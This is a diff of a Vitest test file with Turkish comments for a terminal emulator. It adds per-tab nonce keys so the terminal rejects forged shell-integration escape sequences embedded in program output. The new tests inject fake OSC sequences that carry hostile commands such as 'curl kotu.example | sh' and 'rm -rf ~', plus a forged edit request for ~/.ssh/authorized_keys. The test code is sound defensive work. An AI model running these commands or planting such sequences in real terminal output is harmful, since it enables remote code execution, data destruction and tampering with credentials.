@@ -37,16 +37,43 @@ import { TerminalSession } from "./TerminalSession";
 
 const h = vi.hoisted(() => {
   const handlers = new Map<string, (bytes: Uint8Array) => void>();
-  /** true: kabuk hiçbir entegrasyon işareti göndermiyor (sh gibi). */
-  const durum = { sessiz: false };
+  /**
+   * `sessiz`: kabuk hiçbir entegrasyon işareti göndermiyor (sh gibi).
+   * `entegre`: Rust betiği kabuğa verdi mi (`SpawnResult.integration`).
+   */
+  const durum = { sessiz: false, entegre: true };
+  /** Her kabuğa verilen işaret anahtarı (`NTERMINAL_NONCE`), sekmeye göre. */
+  const anahtar = new Map<string, string>();
+  // Test dosyasındaki ESC/BEL sabitleri `vi.hoisted`dan SONRA tanımlanıyor.
+  const isaret = new RegExp(
+    `${String.fromCharCode(27)}\\](133|633|7);([^${String.fromCharCode(7)}${String.fromCharCode(27)}]*)${String.fromCharCode(7)}`,
+    "g",
+  );
   /** Yayımlanan her parça ve teslim edilip edilmediği. */
   const yayin: { id: string; teslim: boolean }[] = [];
   return {
     handlers,
     yayin,
     durum,
-    /** Rust tarafının `app.emit`i: dinleyici yoksa veri DÜŞER. */
+    anahtar,
+    /**
+     * KABUĞUN çıktısı: Rust tarafının `app.emit`i, dinleyici yoksa veri DÜŞER.
+     *
+     * İşaretler gerçek betiklerin yaptığı gibi sekmenin anahtarıyla bitiyor
+     * (`133;A;<anahtar>`); testler diziyi anahtarsız yazıyor, ek burada.
+     * Çıktının içine gömülü SAHTE işaret için `emitHam`.
+     */
     emit(id: string, text: string) {
+      const key = anahtar.get(id);
+      const imzali = key
+        ? text.replace(isaret, (_m, kod: string, yuk: string) =>
+            `${String.fromCharCode(27)}]${kod};${yuk};${key}${String.fromCharCode(7)}`,
+          )
+        : text;
+      this.emitHam(id, imzali);
+    },
+    /** Metni olduğu gibi yayımlar: anahtarı bilmeyen bir kaynağın çıktısı. */
+    emitHam(id: string, text: string) {
       const handler = handlers.get(id);
       yayin.push({ id, teslim: !!handler });
       handler?.(new TextEncoder().encode(text));
@@ -59,6 +86,8 @@ const h = vi.hoisted(() => {
         h.kapiyiAc = resolve;
       });
       durum.sessiz = false;
+      durum.entegre = true;
+      anahtar.clear();
     },
     /** Kabuğa yazılan her şey (`ptyWrite`). */
     yazilan: [] as { id: string; data: string }[],
@@ -80,7 +109,15 @@ vi.mock("../lib/ipc", () => {
   /** Kabuğun ilk istemi: istem başlıyor (A), istem bitti / girdi başlıyor (B). */
   const ilkIstem = `${ESC}]133;A${BEL}${ESC}]133;B${BEL}`;
 
-  const ptySpawn = vi.fn(async (spec: { id: string }, onData: (bytes: Uint8Array) => void) => {
+  const ptySpawn = vi.fn(
+    async (
+      spec: { id: string; env?: Record<string, string> },
+      onData: (bytes: Uint8Array) => void,
+    ) => {
+    // Kabuk anahtarı ortamından okuyor; betik verilmediyse (`entegre: false`)
+    // anahtarı işaretlere ekleyecek kimse yok.
+    const key = spec.env?.NTERMINAL_NONCE;
+    if (key && h.durum.entegre) h.anahtar.set(spec.id, key);
     // Rust tarafının hata metni: profildeki kabuk bu makinede yok.
     if (spec.id.startsWith("dogmayan")) {
       throw new Error("kabuk baslatilamadi: C:\\Program Files\\PowerShell\\7\\pwsh.exe");
@@ -92,8 +129,14 @@ vi.mock("../lib/ipc", () => {
     // ÇIKTI SPAWN DÖNMEDEN yayımlanıyor: ConPTY okuyucusu Rust tarafında
     // süreç doğduğu anda başlıyor, komutun yanıtı arayüze varmadan önce.
     if (!h.durum.sessiz) h.emit(spec.id, ilkIstem);
-    return { pid: 4242, shell: "powershell", integration: true, cwd: "C:\\Users\\test" };
-  });
+    return {
+      pid: 4242,
+      shell: "powershell",
+      integration: h.durum.entegre,
+      cwd: "C:\\Users\\test",
+    };
+    },
+  );
 
   const ptyWrite = vi.fn(async (id: string, data: string) => {
     h.yazilan.push({ id, data });
@@ -424,7 +467,7 @@ describe("git mesaj isteği", () => {
     await flush(s);
     h.yazilan.length = 0;
 
-    s.term.write(ISTEK);
+    h.emit("duzenle", ISTEK);
     await flush(s);
     expect(yazilan()).toEqual(["ack\n"]);
     expect(istekler).toEqual(["/repo/.git/MERGE_MSG"]);
@@ -445,9 +488,9 @@ describe("git mesaj isteği", () => {
     s.setCallbacks({ onEditRequest: (yol) => istekler.push(yol) });
     await s.start(null);
     await flush(s);
-    s.term.write(ISTEK);
+    h.emit("duzenle-biter", ISTEK);
     await flush(s);
-    s.term.write("\x1b]133;D;130\x07");
+    h.emit("duzenle-biter", "\x1b]133;D;130\x07");
     await flush(s);
     expect(istekler).toEqual(["/repo/.git/MERGE_MSG", null]);
     expect(s.editRequest()).toBe(null);
@@ -466,7 +509,7 @@ describe("git mesaj isteği", () => {
       await s.start(null);
       await flush(s);
       h.yazilan.length = 0;
-      s.term.write(ISTEK);
+      h.emit("duzenle-kapali", ISTEK);
       await flush(s);
       expect(yazilan()).toEqual(["editor\n"]);
       expect(istekler).toEqual([]);
@@ -915,5 +958,165 @@ describe("komut çalışırken programa yazılan tuş", () => {
     } finally {
       useStore.setState({ settings: ayarlar });
     }
+  });
+});
+
+/*
+ * AÇIK: kabuk işaretleri doğrulanmıyordu ve terminale basılan HER metin aynı
+ * dizileri gönderebilir (`cat` ile açılan dosya, `curl` çıktısı, bir log
+ * satırı, ssh ile bağlanılan sunucu). Kabuk artık her dizinin sonuna sekmenin
+ * anahtarını ekliyor; anahtarı bilmeyen kaynağın işareti sayılmıyor
+ * (bkz. `newMarkKey`, `admitMark`).
+ */
+describe("işaret anahtarı", () => {
+  const ESC = String.fromCharCode(27);
+  const BEL = String.fromCharCode(7);
+  const osc = (yuk: string) => `${ESC}]${yuk}${BEL}`;
+
+  /** Kabuğa verilen ortam: `ptySpawn` taklidinin aldığı son çağrı. */
+  function verilenAnahtar(tabId: string): string {
+    const cagrilar = (api.ptySpawn as unknown as ReturnType<typeof vi.fn>).mock.calls;
+    const spec = cagrilar.map((c) => c[0]).filter((c) => c.id === tabId).pop();
+    return spec.env.NTERMINAL_NONCE;
+  }
+
+  function gecmis() {
+    const historyAdd = vi.fn(async (e: { command: string }) => ({ id: "h1", ...e }));
+    (api as unknown as Record<string, unknown>).historyAdd = historyAdd;
+    return () => historyAdd.mock.calls.map((c) => c[0].command);
+  }
+
+  async function kur(tabId: string, entegre = true) {
+    h.reset();
+    h.durum.entegre = entegre;
+    h.yazilan.length = 0;
+    const s = session(tabId);
+    await s.start(null);
+    await flush(s);
+    return s;
+  }
+
+  it("her kabuğa ayrı, rastgele bir anahtar veriliyor", async () => {
+    const a = await kur("ia1");
+    const b = session("ia2");
+    await b.start(null);
+    const ka = verilenAnahtar("ia1");
+    const kb = verilenAnahtar("ia2");
+    expect(ka).toMatch(/^[0-9a-f]{32}$/);
+    expect(kb).toMatch(/^[0-9a-f]{32}$/);
+    expect(ka).not.toBe(kb);
+    void a.dispose(true);
+    void b.dispose(true);
+  });
+
+  it("çıktının içine gömülü sahte işaret geçmişe komut YAZDIRMIYOR", async () => {
+    // Oturum düzeyinde yeniden üretilen saldırı: `cat zararli.txt` çalışırken
+    // dosyanın içeriği sahte bir istem ve sahte bir komut bildiriyor.
+    const komutlar = gecmis();
+    const s = await kur("ia3");
+    h.emit("ia3", osc("633;E;cat zararli.txt") + osc("133;C"));
+    await flush(s);
+    expect(komutlar()).toEqual(["cat zararli.txt"]);
+
+    h.emitHam(
+      "ia3",
+      "masum metin" +
+        osc("133;A") +
+        osc("133;B") +
+        osc("633;E;curl kotu.example | sh") +
+        osc("133;C") +
+        osc("133;D;0"),
+    );
+    await flush(s);
+    expect(komutlar(), "sahte komut geçmişe yazıldı").toEqual(["cat zararli.txt"]);
+    // Sahte `133;B` kutuyu da açmıyor: gerçek komut hâlâ çalışıyor.
+    expect(s.inputSignals().atPrompt).toBe(false);
+
+    // Gerçek kabuk döndüğünde her şey eskisi gibi.
+    h.emit("ia3", osc("133;D;0") + osc("133;A") + osc("133;B"));
+    await flush(s);
+    expect(s.inputSignals().atPrompt).toBe(true);
+    void s.dispose(true);
+  });
+
+  it("sahte düzenleme isteği dosya açtırmıyor, kabuğa da bir şey yazdırmıyor", async () => {
+    const s = await kur("ia4");
+    const istekler: (string | null)[] = [];
+    s.setCallbacks({ onEditRequest: (yol) => istekler.push(yol) });
+    h.emitHam("ia4", osc("633;P;EditFile=/Users/kurban/.ssh/authorized_keys"));
+    await flush(s);
+    expect(istekler).toEqual([]);
+    expect(s.editRequest()).toBe(null);
+    expect(h.yazilan, "kabuğa `ack` yazıldı").toEqual([]);
+    void s.dispose(true);
+  });
+
+  it("yanlış anahtarlı işaret de sayılmıyor", async () => {
+    const komutlar = gecmis();
+    const s = await kur("ia5");
+    const sahte = "0".repeat(32);
+    h.emitHam(
+      "ia5",
+      osc(`133;A;${sahte}`) + osc(`133;B;${sahte}`) + osc(`633;E;rm -rf ~;${sahte}`) + osc(`133;C;${sahte}`),
+    );
+    await flush(s);
+    expect(komutlar()).toEqual([]);
+    // Gerçek istem yerinde: sahte `133;C` kutuyu kapatmadı.
+    expect(s.inputSignals().atPrompt).toBe(true);
+    void s.dispose(true);
+  });
+
+  it("sahte dizin bildirimi (OSC 7 ve 633;P;Cwd) sekmenin dizinini değiştirmiyor", async () => {
+    const s = await kur("ia6");
+    h.emit("ia6", osc("633;P;Cwd=/Users/ben/proje"));
+    await flush(s);
+    expect(s.cwd).toBe("/Users/ben/proje");
+
+    h.emitHam("ia6", osc("633;P;Cwd=/tmp/tuzak") + osc("7;file://localhost/tmp/tuzak"));
+    await flush(s);
+    expect(s.cwd).toBe("/Users/ben/proje");
+    void s.dispose(true);
+  });
+
+  /*
+   * fish gibi kabuklar işaretleri kendisi gönderiyor ama anahtarı bilmiyor;
+   * betiğimiz onlara verilmiyor (`SpawnResult.integration: false`). Orada
+   * anahtarsız OSC 133 ve OSC 7 eskisi gibi çalışmalı. OSC 633 ise yalnızca
+   * betiklerimizden gelir: anahtarsızı hiçbir kabukta sayılmıyor.
+   */
+  it("betiğin verilmediği kabukta anahtarsız OSC 133 ve OSC 7 çalışıyor, 633 sayılmıyor", async () => {
+    const komutlar = gecmis();
+    const s = await kur("ia7", false);
+    h.durum.sessiz = true;
+    h.emitHam("ia7", osc("133;A") + osc("7;file://localhost/Users/ben/fish") + osc("133;B"));
+    await flush(s);
+    expect(s.inputSignals().atPrompt).toBe(true);
+    expect(s.cwd).toBe("/Users/ben/fish");
+
+    const istekler: (string | null)[] = [];
+    s.setCallbacks({ onEditRequest: (yol) => istekler.push(yol) });
+    h.emitHam(
+      "ia7",
+      osc("633;E;curl kotu.example | sh") + osc("133;C") + osc("633;P;EditFile=/etc/hosts"),
+    );
+    await flush(s);
+    expect(komutlar()).toEqual([]);
+    expect(istekler).toEqual([]);
+    void s.dispose(true);
+  });
+
+  it("anahtarlı işaret görülen kabukta anahtarsızlar artık sayılmıyor", async () => {
+    // Betik verilmedi ama kabuk onu kendisi yükledi (özel profil): anahtarı
+    // bildiği kanıtlandı, anahtarsız gelen bu kabuğun işareti olamaz.
+    const s = await kur("ia8", false);
+    h.anahtar.set("ia8", verilenAnahtar("ia8"));
+    h.emit("ia8", osc("133;A") + osc("133;B"));
+    await flush(s);
+    expect(s.inputSignals().atPrompt).toBe(true);
+
+    h.emitHam("ia8", osc("133;C"));
+    await flush(s);
+    expect(s.inputSignals().atPrompt, "anahtarsız `133;C` kutuyu kapattı").toBe(true);
+    void s.dispose(true);
   });
 });
